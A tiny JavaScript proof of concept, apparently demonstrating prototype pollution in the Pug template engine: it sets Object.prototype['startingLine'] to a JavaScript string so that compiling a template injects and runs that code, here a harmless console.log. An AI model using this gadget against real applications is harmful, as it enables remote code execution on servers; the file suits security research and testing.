pug = require("pug")


Object.prototype['startingLine'] = "console.log('code injection!!!')"


const template = pug.compile(`h1= msg`);
console.log(template({msg: "Hello World"}));